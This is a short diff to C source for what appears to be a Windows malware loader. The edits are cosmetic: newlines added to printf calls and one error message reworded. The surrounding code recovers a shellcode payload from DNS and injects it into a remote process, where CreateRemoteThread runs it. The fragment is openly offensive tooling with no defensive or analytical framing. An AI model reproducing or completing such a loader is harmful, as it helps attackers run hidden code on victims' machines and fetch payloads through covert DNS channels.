@@ -157,11 +157,11 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, PBYTE pShellcode, SIZE_T
 
 
 
-    printf("Executing the shellcode in the remote process using CreateRemoteThread");
+    printf("Executing the shellcode in the remote process using CreateRemoteThread\n");
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);	if (hThread == NULL) {
         printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
     }
-    printf("Thread ID: %lu", GetThreadId(hThread));
+    printf("Thread ID: %lu\n", GetThreadId(hThread));
     printf("DONE !\n");
     if (hThread) {
         CloseHandle(hThread);
@@ -198,10 +198,8 @@ int wmain(int argc, wchar_t* argv[]) {
     printf("Payload recovered from DNS (%zu bytes).\n", sPayloadSize);
 
 
-
-
     if (!InjectShellcodeToRemoteProcess(hProcess, pPayloadBytes, sPayloadSize)) {
-        printf("Cross-process shellcode execution failed.\n");
+        printf("shellcode execution failed.\n");
         if (pPayloadBytes) LocalFree(pPayloadBytes);
         CloseHandle(hProcess);
         return -1;
